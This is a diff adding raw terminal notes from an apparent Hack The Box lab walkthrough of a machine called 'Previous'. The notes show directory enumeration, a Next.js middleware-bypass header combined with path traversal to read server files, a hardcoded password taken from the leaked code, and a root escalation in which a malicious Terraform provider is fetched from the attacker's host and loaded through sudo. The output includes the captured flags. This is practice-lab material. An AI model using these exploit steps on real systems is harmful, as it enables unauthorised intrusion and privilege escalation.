@@ -9,9 +9,6 @@
 
 
 ---
-
-## 📝 Description
-
 ======================================================================================
 ##┌──(sabeshan㉿kali)-[~]
 └─$ dirsearch -u http://previous.htb/api/auth/
@@ -43,4 +40,327 @@ Target: http://previous.htb/
 [07:48:24] 302 -    0B  - /api/auth/signin  ->  /signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000
 [07:48:25] 200 -    5KB - /api/auth/signout 
 ===========================================================================================================
+┌──(sabeshan㉿kali)-[~]
+└─$ curl "http://previous.htb/api/download?example=../../../../../../../app/.next/routes-manifest.json" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" -s | jq
 
+{
+  "version": 3,
+  "pages404": true,
+  "caseSensitive": false,
+  "basePath": "",
+  "redirects": [
+    {
+      "source": "/:path+/",
+      "destination": "/:path+",
+      "internal": true,
+      "statusCode": 308,
+      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
+    }
+  ],
+  "headers": [],
+  "dynamicRoutes": [
+    {
+      "page": "/api/auth/[...nextauth]",
+      "regex": "^/api/auth/(.+?)(?:/)?$",
+      "routeKeys": {
+        "nxtPnextauth": "nxtPnextauth"
+      },
+      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
+    },
+    {
+      "page": "/docs/[section]",
+      "regex": "^/docs/([^/]+?)(?:/)?$",
+      "routeKeys": {
+        "nxtPsection": "nxtPsection"
+      },
+      "namedRegex": "^/docs/(?<nxtPsection>[^/]+?)(?:/)?$"
+    }
+  ],
+  "staticRoutes": [
+    {
+      "page": "/",
+      "regex": "^/(?:/)?$",
+      "routeKeys": {},
+      "namedRegex": "^/(?:/)?$"
+    },
+    {
+      "page": "/docs",
+      "regex": "^/docs(?:/)?$",
+      "routeKeys": {},
+      "namedRegex": "^/docs(?:/)?$"
+    },
+    {
+      "page": "/docs/components/layout",
+      "regex": "^/docs/components/layout(?:/)?$",
+      "routeKeys": {},
+      "namedRegex": "^/docs/components/layout(?:/)?$"
+    },
+    {
+      "page": "/docs/components/sidebar",
+      "regex": "^/docs/components/sidebar(?:/)?$",
+      "routeKeys": {},
+      "namedRegex": "^/docs/components/sidebar(?:/)?$"
+    },
+    {
+      "page": "/docs/content/examples",
+      "regex": "^/docs/content/examples(?:/)?$",
+      "routeKeys": {},
+      "namedRegex": "^/docs/content/examples(?:/)?$"
+    },
+    {
+      "page": "/docs/content/getting-started",
+      "regex": "^/docs/content/getting\\-started(?:/)?$",
+      "routeKeys": {},
+      "namedRegex": "^/docs/content/getting\\-started(?:/)?$"
+    },
+    {
+      "page": "/signin",
+      "regex": "^/signin(?:/)?$",
+      "routeKeys": {},
+      "namedRegex": "^/signin(?:/)?$"
+    }
+  ],
+  "dataRoutes": [],
+  "rsc": {
+    "header": "RSC",
+    "varyHeader": "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch",
+    "prefetchHeader": "Next-Router-Prefetch",
+    "didPostponeHeader": "x-nextjs-postponed",
+    "contentTypeHeader": "text/x-component",
+    "suffix": ".rsc",
+    "prefetchSuffix": ".prefetch.rsc",
+    "prefetchSegmentHeader": "Next-Router-Segment-Prefetch",
+    "prefetchSegmentSuffix": ".segment.rsc",
+    "prefetchSegmentDirSuffix": ".segments"
+  },
+  "rewriteHeaders": {
+    "pathHeader": "x-nextjs-rewritten-path",
+    "queryHeader": "x-nextjs-rewritten-query"
+  },
+  "rewrites": []
+}
+================================================================================================================
+──(sabeshan㉿kali)-[~]
+└─$ curl "http://previous.htb/api/download?example=../../../../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"        
+"use strict";
+(()=>{var e={};e.id=651,e.ids=[651],
+e.modules={3480:(e,n,r)=>{e.exports=r(5600)},
+5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},
+6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},
+8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},
+9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);
+let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},
+providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},
+authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],
+pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),
+A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},
+userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
+|-----> ssh creds ->jeremy:MyNameIsJeremyAndILovePancakes
+=========================================================================================================================
+┌──(sabeshan㉿kali)-[~]
+└─$ cd HTB/Previous
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/Previous]
+└─$ mousepad terraform-provider-examples.go
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/Previous]
+└─$ GOOS=linux GOARCH=amd64 go build -o terraform-provider-examples terraform-provider-examples.go
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/Previous]
+└─$ ls -la
+total 2328
+drwxrwxr-x  3 sabeshan sabeshan    4096 Aug 31 11:09 .
+drwxrwxr-x 19 sabeshan sabeshan    4096 Aug 29 20:07 ..
+drwxrwxr-x  4 sabeshan sabeshan    4096 Aug 30 08:21 exploit-CVE-2025-29927
+-rwxrwxr-x  1 sabeshan sabeshan 2364323 Aug 31 11:09 terraform-provider-examples
+-rw-rw-r--  1 sabeshan sabeshan     197 Aug 31 11:08 terraform-provider-examples.go
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/Previous]
+└─$ sudo python3 -m http.server 8000    
+[sudo] password for sabeshan: 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.83 - - [31/Aug/2025 11:11:28] "GET /terraform-provider-examples HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/Previous]
+└─$ cat terraform-provider-examples.go 
+package main
+
+import (
+    "os"
+    "os/exec"
+)
+
+func main() {
+    cmd := exec.Command("cat", "/root/root.txt")
+    output, _ := cmd.Output()
+    os.WriteFile("/tmp/root_flag.txt", output, 0644)
+}
+                                                                                                                                                             
+┌──(sabeshan㉿kali)-[~/HTB/Previous]
+└─$ 
+======================================================================================================================
+jeremy@previous:~$ sudo -l
+[sudo] password for jeremy: 
+Matching Defaults entries for jeremy on previous:
+    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir\=/opt/examples apply
+jeremy@previous:~$ ls -la
+total 36
+drwxr-x--- 4 jeremy jeremy 4096 Aug 21 20:24 .
+drwxr-xr-x 3 root   root   4096 Aug 21 20:09 ..
+lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
+-rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
+-rw-r--r-- 1 jeremy jeremy 3771 Aug 21 17:28 .bashrc
+drwx------ 2 jeremy jeremy 4096 Aug 21 20:09 .cache
+drwxr-xr-x 3 jeremy jeremy 4096 Aug 21 20:09 docker
+-rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
+-rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
+-rw-r----- 1 root   jeremy   33 Aug 29 09:18 user.txt
+jeremy@previous:~$ cd docker/
+jeremy@previous:~/docker$ ls -la
+total 16
+drwxr-xr-x 3 jeremy jeremy 4096 Aug 21 20:09 .
+drwxr-x--- 4 jeremy jeremy 4096 Aug 21 20:24 ..
+-rw-r--r-- 1 jeremy jeremy  107 Apr 12 20:32 docker-compose.yml
+drwxr-xr-x 7 jeremy jeremy 4096 Aug 21 20:09 previous
+jeremy@previous:~/docker$ cd previous/
+jeremy@previous:~/docker/previous$ ls -la
+total 192
+drwxr-xr-x 7 jeremy jeremy   4096 Aug 21 20:09 .
+drwxr-xr-x 3 jeremy jeremy   4096 Aug 21 20:09 ..
+-rw-r--r-- 1 jeremy jeremy    154 Apr 12 20:32 app.json
+drwxr-xr-x 2 jeremy jeremy   4096 Aug 21 20:09 components
+-rw-r--r-- 1 jeremy jeremy   2174 Apr 12 20:32 Dockerfile
+-rw-r--r-- 1 jeremy jeremy     73 Apr 12 20:32 .dockerignore
+-rw-r--r-- 1 jeremy jeremy     49 Apr 12 20:32 .env
+-rw-r--r-- 1 jeremy jeremy    437 Apr 12 20:32 .gitignore
+drwxr-xr-x 2 jeremy jeremy   4096 Aug 21 20:09 lib
+-rw-r--r-- 1 jeremy jeremy    109 Apr 12 20:32 middleware.ts
+-rw-r--r-- 1 jeremy jeremy    288 Apr 12 20:32 next.config.mjs
+-rw-r--r-- 1 jeremy jeremy    587 Apr 12 20:32 package.json
+-rw-r--r-- 1 jeremy jeremy 125651 Apr 12 20:32 package-lock.json
+drwxr-xr-x 4 jeremy jeremy   4096 Aug 21 20:09 pages
+-rw-r--r-- 1 jeremy jeremy    101 Apr 12 20:32 postcss.config.mjs
+drwxr-xr-x 3 jeremy jeremy   4096 Aug 21 20:09 public
+drwxr-xr-x 2 jeremy jeremy   4096 Aug 21 20:09 styles
+-rw-r--r-- 1 jeremy jeremy    651 Apr 12 20:32 tsconfig.json
+jeremy@previous:~/docker/previous$ cd ../../
+jeremy@previous:~$ ls
+docker  user.txt
+jeremy@previous:~$ ls -la
+total 36
+drwxr-x--- 4 jeremy jeremy 4096 Aug 21 20:24 .
+drwxr-xr-x 3 root   root   4096 Aug 21 20:09 ..
+lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
+-rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
+-rw-r--r-- 1 jeremy jeremy 3771 Aug 21 17:28 .bashrc
+drwx------ 2 jeremy jeremy 4096 Aug 21 20:09 .cache
+drwxr-xr-x 3 jeremy jeremy 4096 Aug 21 20:09 docker
+-rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
+-rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
+-rw-r----- 1 root   jeremy   33 Aug 29 09:18 user.txt
+jeremy@previous:~$ mkdir -p /tmp/provider
+jeremy@previous:~$ wget http://10.10.14.4:8000/terraform-provider-examples -o /tmp/provider/
+wget: /tmp/provider/: Is a directory
+jeremy@previous:~$ wget http://10.10.14.4:8000/terraform-provider-examples -o /tmp/provider
+wget: /tmp/provider: Is a directory
+jeremy@previous:~$ wget http://10.10.14.4:8000/terraform-provider-examples
+--2025-08-31 05:41:13--  http://10.10.14.4:8000/terraform-provider-examples
+Connecting to 10.10.14.4:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2364323 (2.3M) [application/octet-stream]
+Saving to: ‘terraform-provider-examples’
+
+terraform-provider-examples                     100%[====================================================================================================>]   2.25M   291KB/s    in 9.8s    
+
+2025-08-31 05:41:23 (235 KB/s) - ‘terraform-provider-examples’ saved [2364323/2364323]
+
+jeremy@previous:~$ cp ./terraform-provider-examples /tmp/provider/
+jeremy@previous:~$ chmod +x /tmp/provider/terraform-provider-examples
+jeremy@previous:~$ cat > /tmp/exp.rc << 'EOF'
+> provider_installation {
+  dev_overrides {
+    "previous.htb/terraform/examples" = "/tmp/provider"
+  }
+  direct {}
+}
+EOF
+jeremy@previous:~$ export TF_CLI_CONFIG_FILE=/tmp/exp.rc
+jeremy@previous:~$ sudo /usr/bin/terraform -chdir\=/opt/examples apply
+[sudo] password for jeremy: 
+╷
+│ Warning: Provider development overrides are in effect
+│ 
+│ The following provider development overrides are set in the CLI configuration:
+│  - previous.htb/terraform/examples in /tmp/provider
+│ 
+│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
+╵
+╷
+│ Error: Failed to load plugin schemas
+│ 
+│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider previous.htb/terraform/examples: failed to instantiate
+│ provider "previous.htb/terraform/examples" to obtain schema: Unrecognized remote plugin message: 
+│ Failed to read any lines from plugin's stdout
+│ This usually means
+│   the plugin was not compiled for this architecture,
+│   the plugin is missing dynamic-link libraries necessary to run,
+│   the plugin is not executable by this process due to file permissions, or
+│   the plugin failed to negotiate the initial go-plugin protocol handshake
+│ 
+│ Additional notes about plugin:
+│   Path: /tmp/provider/terraform-provider-examples
+│   Mode: -rwxrwxr-x
+│   Owner: 1000 [jeremy] (current: 0 [root])
+│   Group: 1000 [jeremy] (current: 0 [root])
+│   ELF architecture: EM_X86_64 (current architecture: amd64)
+│ ..
+╵
+jeremy@previous:~$ id
+uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
+jeremy@previous:~$ cat /tmp/root.txt
+cat: /tmp/root.txt: No such file or directory
+jeremy@previous:~$ ls -la
+total 2352
+drwxr-x--- 5 jeremy jeremy    4096 Aug 31 05:43 .
+drwxr-xr-x 3 root   root      4096 Aug 21 20:09 ..
+lrwxrwxrwx 1 root   root         9 Aug 21 19:57 .bash_history -> /dev/null
+-rw-r--r-- 1 jeremy jeremy     220 Aug 21 17:28 .bash_logout
+-rw-r--r-- 1 jeremy jeremy    3771 Aug 21 17:28 .bashrc
+drwx------ 2 jeremy jeremy    4096 Aug 21 20:09 .cache
+drwxr-xr-x 3 jeremy jeremy    4096 Aug 21 20:09 docker
+-rw-r--r-- 1 jeremy jeremy     807 Aug 21 17:28 .profile
+drwxr-xr-x 2 root   root      4096 Aug 31 05:43 .terraform.d
+-rw-rw-r-- 1 jeremy jeremy 2364323 Aug 31 05:39 terraform-provider-examples
+-rw-rw-r-- 1 jeremy jeremy     150 Aug 21 18:48 .terraformrc
+-rw-r----- 1 root   jeremy      33 Aug 29 09:18 user.txt
+jeremy@previous:~$ cd /tmp
+jeremy@previous:/tmp$ ls -la
+total 64
+drwxrwxrwt 14 root   root   4096 Aug 31 05:43 .
+drwxr-xr-x 18 root   root   4096 Aug 21 20:23 ..
+-rw-rw-r--  1 jeremy jeremy  116 Aug 31 05:42 exp.rc
+drwxrwxrwt  2 root   root   4096 Aug 29 09:17 .font-unix
+drwxrwxrwt  2 root   root   4096 Aug 29 09:17 .ICE-unix
+drwxrwxr-x  2 jeremy jeremy 4096 Aug 31 05:41 provider
+-rw-r--r--  1 root   root     33 Aug 31 05:43 root_flag.txt
+drwx------  3 root   root   4096 Aug 29 09:17 systemd-private-5688cd2c4c3044dc961f4743ecd49bcb-ModemManager.service-hzCdU8
+drwx------  3 root   root   4096 Aug 29 09:17 systemd-private-5688cd2c4c3044dc961f4743ecd49bcb-systemd-logind.service-smw4RN
+drwx------  3 root   root   4096 Aug 29 09:17 systemd-private-5688cd2c4c3044dc961f4743ecd49bcb-systemd-resolved.service-eE62fY
+drwx------  3 root   root   4096 Aug 29 09:17 systemd-private-5688cd2c4c3044dc961f4743ecd49bcb-systemd-timesyncd.service-fvR5Ii
+drwx------  3 root   root   4096 Aug 29 17:29 systemd-private-5688cd2c4c3044dc961f4743ecd49bcb-upower.service-2moEIA
+drwxrwxrwt  2 root   root   4096 Aug 29 09:17 .Test-unix
+drwx------  2 root   root   4096 Aug 29 09:18 vmware-root_608-2722828967
+drwxrwxrwt  2 root   root   4096 Aug 29 09:17 .X11-unix
+drwxrwxrwt  2 root   root   4096 Aug 29 09:17 .XIM-unix
+jeremy@previous:/tmp$ cat root_flag.txt 
+d057d8c0243a7ec1253f75b7465563ff
+jeremy@previous:/tmp$ cd ~
+jeremy@previous:~$ cat user.txt
+4d3278a4d340781344ce75f57aa54937
+jeremy@previous:~$ 
+======================================================================================
